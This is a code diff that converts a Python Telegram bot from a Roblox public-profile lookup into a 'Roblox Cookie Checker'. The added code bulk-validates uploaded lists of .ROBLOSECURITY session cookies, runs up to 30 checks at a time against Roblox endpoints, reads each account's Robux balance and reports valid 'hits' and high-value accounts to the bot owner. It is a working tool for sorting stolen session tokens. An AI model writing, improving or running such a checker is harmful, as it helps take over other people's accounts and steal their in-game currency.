@@ -1,22 +1,52 @@
-import requests
+import asyncio
+import aiohttp
 import telebot
 import time
+import threading
 from datetime import datetime
 from config import BOT_TOKEN, OWNER_ID
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-start_time = time.time()
-stats = {
-    "total": 0,
-    "found": 0,
-    "not_found": 0,
-    "errors": 0,
-}
+# ─── Stats ────────────────────────────────────────────────────────────
+class CheckerStats:
+    def __init__(self):
+        self.reset()
 
+    def reset(self):
+        self.total = 0
+        self.hits = 0
+        self.dead = 0
+        self.checked = 0
+        self.start_time = None
+        self.hits_list = []       # list of (username, user_id, robux)
+        self.high_robux = []      # users with high robux value
+        self.all_robux = 0        # total robux across all hits
+        self._lock = threading.Lock()
 
+    def add_hit(self, username, user_id, robux):
+        with self._lock:
+            self.hits += 1
+            self.checked += 1
+            self.all_robux += robux
+            self.hits_list.append((username, user_id, robux))
+            if robux >= 1000:
+                self.high_robux.append((username, user_id, robux))
+
+    def add_dead(self):
+        with self._lock:
+            self.dead += 1
+            self.checked += 1
+
+    def elapsed(self):
+        if not self.start_time:
+            return 0
+        return time.time() - self.start_time
+
+stats = CheckerStats()
+
+# ─── Owner-only decorator ─────────────────────────────────────────────
 def owner_only(func):
-    """Decorator to restrict commands to the owner."""
     def wrapper(message):
         if message.from_user.id != OWNER_ID:
             bot.reply_to(message, "⛔ Access denied. Owner only.")
@@ -24,168 +54,211 @@ def owner_only(func):
         return func(message)
     return wrapper
 
-
-def parse_date(date_str):
-    if not date_str:
-        return "Unknown Date"
-    formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"]
-    for fmt in formats:
-        try:
-            return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d")
-        except ValueError:
-            continue
-    return "Unknown Date"
-
-
-def get_roblox_user_info(username):
-    user_lookup_url = "https://users.roblox.com/v1/usernames/users"
-    response = requests.post(user_lookup_url, json={"usernames": [username]})
-    response.raise_for_status()
-
-    data = response.json().get("data", [])
-    if not data:
-        return None
-
-    user_id = data[0]["id"]
-
-    profile = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
-    friends = requests.get(
-        f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
-    ).json().get("count", 0)
-    followers = requests.get(
-        f"https://friends.roblox.com/v1/users/{user_id}/followers/count"
-    ).json().get("count", 0)
-    badges = requests.get(
-        f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100"
-    ).json().get("data", [])
-    groups = requests.get(
-        f"https://groups.roblox.com/v1/users/{user_id}/groups/roles"
-    ).json().get("data", [])
-    collectibles = requests.get(
-        f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10"
-    ).json().get("data", [])
-
-    avatar_resp = requests.get(
-        f"https://thumbnails.roblox.com/v1/users/avatar-headshot"
-        f"?userIds={user_id}&size=150x150&format=Png"
-    ).json()
-    avatar_url = "N/A"
-    avatar_data = avatar_resp.get("data", [])
-    if avatar_data:
-        avatar_url = avatar_data[0].get("imageUrl", "N/A")
-
-    description = profile.get("description", "").strip() or "N/A"
-
-    return {
-        "UserID": user_id,
-        "Username": profile.get("name"),
-        "DisplayName": profile.get("displayName"),
-        "ProfileURL": f"https://www.roblox.com/users/{user_id}/profile",
-        "Description": description,
-        "IsBanned": profile.get("isBanned", False),
-        "AccountAgeDays": profile.get("age"),
-        "JoinDate": parse_date(profile.get("created")),
-        "BadgeCount": len(badges),
-        "CollectibleCount": len(collectibles),
-        "GroupCount": len(groups),
-        "FriendCount": friends,
-        "FollowerCount": followers,
-        "AvatarURL": avatar_url,
-    }
-
-
-def format_user_info(info):
-    banned_status = "Yes ⚠️" if info["IsBanned"] else "No"
-    return (
-        f"🔎 *Roblox User Info*\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 *Username:* `{info['Username']}`\n"
-        f"🏷 *Display Name:* `{info['DisplayName']}`\n"
-        f"🆔 *User ID:* `{info['UserID']}`\n"
-        f"🔗 *Profile:* [Link]({info['ProfileURL']})\n"
-        f"📝 *Description:* {info['Description']}\n"
-        f"🚫 *Banned:* {banned_status}\n"
-        f"📅 *Join Date:* {info['JoinDate']}\n"
-        f"📆 *Account Age:* {info['AccountAgeDays']} days\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"🏅 *Badges:* {info['BadgeCount']}\n"
-        f"🎒 *Collectibles:* {info['CollectibleCount']}\n"
-        f"👥 *Groups:* {info['GroupCount']}\n"
-        f"🤝 *Friends:* {info['FriendCount']}\n"
-        f"👣 *Followers:* {info['FollowerCount']}\n"
-    )
-
-
-@bot.message_handler(commands=["start"])
-@owner_only
-def handle_start(message):
-    bot.reply_to(
-        message,
-        "👋 *Welcome to Roblox User Lookup Bot!*\n\n"
-        "Send /lookup `<username>` to search for a Roblox user.\n"
-        "Example: `/lookup Roblox`",
-        parse_mode="Markdown",
-    )
-
-
-@bot.message_handler(commands=["lookup"])
-@owner_only
-def handle_lookup(message):
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        bot.reply_to(message, "Usage: `/lookup <username>`", parse_mode="Markdown")
-        return
-
-    username = args[1].strip()
-    bot.reply_to(message, f"🔍 Looking up *{username}*...", parse_mode="Markdown")
-
-    try:
-        stats["total"] += 1
-        info = get_roblox_user_info(username)
-        if info:
-            stats["found"] += 1
-            bot.send_message(
-                message.chat.id, format_user_info(info), parse_mode="Markdown"
-            )
-        else:
-            stats["not_found"] += 1
-            bot.send_message(
-                message.chat.id,
-                f"❌ User `{username}` not found.",
-                parse_mode="Markdown",
-            )
-    except Exception as e:
-        stats["errors"] += 1
-        bot.send_message(message.chat.id, f"❌ Error: {e}")
-
-
+# ─── Format elapsed time ──────────────────────────────────────────────
 def format_elapsed(seconds):
     h = int(seconds // 3600)
     m = int((seconds % 3600) // 60)
     s = int(seconds % 60)
     return f"{h:02d}:{m:02d}:{s:02d}"
 
+# ─── Progress message builder ─────────────────────────────────────────
+def build_progress_text():
+    elapsed = stats.elapsed()
+    hits_text = ""
+    if stats.hits_list:
+        for username, user_id, robux in stats.hits_list:
+            hits_text += f"  💎 `{username}` ({robux} R$)\n"
+    else:
+        hits_text = "  None yet\n"
+
+    return (
+        f"⚡️ CHECKING ⚡️\n"
+        f"━━━━━━━━━━━━━━━━━\n"
+        f"📊 Progress:\n"
+        f"🔑 Total: {stats.total}\n"
+        f"💎 Hits: {stats.hits}\n"
+        f"❌ Dead: {stats.dead}\n"
+        f"📝 Checked: {stats.checked}/{stats.total}\n"
+        f"━━━━━━━━━━━━━━━━━\n"
+        f"⏱️ Time: {format_elapsed(elapsed)}\n"
+        f"━━━━━━━━━━━━━━━━━\n"
+        f"💎 Hits:\n"
+        f"{hits_text}"
+        f"🔥 all robux: {stats.all_robux}\n"
+        f"💎 high robux value user: {len(stats.high_robux)}"
+    )
+
+# ─── Async Cookie Validator ───────────────────────────────────────────
+ROBLOX_AUTH_URL = "https://www.roblox.com/mobileapi/userinfo"
+ROBLOX_USER_URL = "https://users.roblox.com/v1/users/{}"
+ROBLOX_CURRENCY_URL = "https://economy.roblox.com/v1/users/{}/currency"
+
+CONCURRENCY = 30  # concurrent requests for speed
+
+async def validate_cookie(session, cookie):
+    """Validate a single cookie. Returns (valid, username, user_id, robux) or (False, None, None, 0)."""
+    try:
+        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+        async with session.get(ROBLOX_AUTH_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            if resp.status != 200:
+                return (False, None, None, 0)
+            data = await resp.json(content_type=None)
+            if "UserID" not in data:
+                return (False, None, None, 0)
+            user_id = data["UserID"]
+            username = data.get("UserName", data.get("Username", f"User{user_id}"))
+            # Get robux — only if cookie is valid
+            robux = 0
+            try:
+                async with session.get(
+                    ROBLOX_CURRENCY_URL.format(user_id),
+                    headers=headers,
+                    timeout=aiohttp.ClientTimeout(total=8)
+                ) as currency_resp:
+                    if currency_resp.status == 200:
+                        cdata = await currency_resp.json(content_type=None)
+                        robux = cdata.get("robux", 0)
+            except Exception:
+                pass
+            return (True, username, user_id, robux)
+    except Exception:
+        return (False, None, None, 0)
+
+async def run_checker(chat_id, progress_msg, cookies):
+    """Run the checker with concurrency and live progress updates."""
+    stats.reset()
+    stats.total = len(cookies)
+    stats.start_time = time.time()
+
+    connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        sem = asyncio.Semaphore(CONCURRENCY)
+
+        async def check_one(cookie):
+            async with sem:
+                result = await validate_cookie(session, cookie)
+                if result[0]:
+                    stats.add_hit(result[1], result[2], result[3])
+                else:
+                    stats.add_dead()
+                return result
+
+        tasks = [check_one(c) for c in cookies]
+
+        # Progress updater — updates the Telegram message every 3 seconds
+        last_update = [0]
+        async def progress_updater():
+            while stats.checked < stats.total:
+                await asyncio.sleep(2)
+                try:
+                    bot.edit_message_text(
+                        build_progress_text(),
+                        chat_id,
+                        progress_msg.message_id,
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
+
+        updater_task = asyncio.create_task(progress_updater())
+        await asyncio.gather(*tasks)
+        updater_task.cancel()
+
+    # Final update
+    try:
+        bot.edit_message_text(
+            build_progress_text(),
+            chat_id,
+            progress_msg.message_id,
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
+    # Send detailed hits
+    if stats.hits_list:
+        hits_detail = "💎 *HITS DETAILS:*\n━━━━━━━━━━━━━━━━━\n"
+        for username, user_id, robux in stats.hits_list:
+            hits_detail += f"👤 `{username}` | ID: `{user_id}` | 💰 {robux} R$\n"
+            hits_detail += f"🔗 https://www.roblox.com/users/{user_id}/profile\n\n"
+        hits_detail += f"\n🔥 Total Robux: {stats.all_robux}"
+        try:
+            bot.send_message(chat_id, hits_detail, parse_mode="Markdown")
+        except Exception:
+            # Split if too long
+            chunks = [hits_detail[i:i+4000] for i in range(0, len(hits_detail), 4000)]
+            for chunk in chunks:
+                bot.send_message(chat_id, chunk)
+
+# ─── Bot Commands ──────────────────────────────────────────────────────
+
+@bot.message_handler(commands=["start"])
+@owner_only
+def handle_start(message):
+    bot.reply_to(
+        message,
+        "⚡️ *Roblox Cookie Checker Bot* ⚡️\n\n"
+        "🔥 /check - Check cookies from a text file\n"
+        "📊 /stats - View current stats\n"
+        "❓ /help - Help info",
+        parse_mode="Markdown"
+    )
+
+@bot.message_handler(commands=["help"])
+@owner_only
+def handle_help(message):
+    bot.reply_to(
+        message,
+        "⚡️ *Cookie Checker Help* ⚡️\n\n"
+        "1️⃣ Send /check with a .txt file attached containing cookies (one per line)\n"
+        "2️⃣ The bot will validate each cookie concurrently\n"
+        "3️⃣ Live progress is shown during checking\n"
+        "4️⃣ After completion, hit details are displayed\n\n"
+        "💡 Cookies must be .ROBLOSECURITY tokens",
+        parse_mode="Markdown"
+    )
+
+@bot.message_handler(commands=["check"])
+@owner_only
+def handle_check(message):
+    # Check if a document is attached
+    if not message.document:
+        bot.reply_to(message, "❌ Please attach a .txt file with cookies.\nUsage: /check with file attached", parse_mode="Markdown")
+        return
+
+    file_info = bot.get_file(message.document.file_id)
+    downloaded = bot.download_file(file_info.file_path)
+    content = downloaded.decode("utf-8", errors="ignore")
+    cookies = [line.strip() for line in content.splitlines() if line.strip()]
+
+    if not cookies:
+        bot.reply_to(message, "❌ No cookies found in the file.")
+        return
+
+    # Send initial progress message
+    stats.reset()
+    stats.total = len(cookies)
+    stats.start_time = time.time()
+    progress_msg = bot.reply_to(message, build_progress_text(), parse_mode="Markdown")
+
+    # Run the async checker in a thread so it doesn't block the bot
+    def run_in_thread():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(run_checker(message.chat.id, progress_msg, cookies))
+        finally:
+            loop.close()
+
+    thread = threading.Thread(target=run_in_thread, daemon=True)
+    thread.start()
 
 @bot.message_handler(commands=["stats"])
 @owner_only
 def handle_stats(message):
-    elapsed = time.time() - start_time
-    checked = stats["found"] + stats["not_found"] + stats["errors"]
-    text = (
-        f"⚡ *CHECKING* ⚡\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 *Progress:*\n"
-        f"🔑 *Total:* {stats['total']}\n"
-        f"💎 *Hits:* {stats['found']}\n"
-        f"❌ *Dead:* {stats['not_found']}\n"
-        f"📝 *Checked:* {checked}/{stats['total']}\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"⏱️ *Time:* {format_elapsed(elapsed)}\n"
-        f"━━━━━━━━━━━━━━━━━━━"
-    )
-    bot.reply_to(message, text, parse_mode="Markdown")
+    bot.reply_to(message, build_progress_text(), parse_mode="Markdown")
 
-
+# ─── Start ─────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    print("Bot is running...")
+    print("⚡️ Cookie Checker Bot is running...")
     bot.infinity_polling()
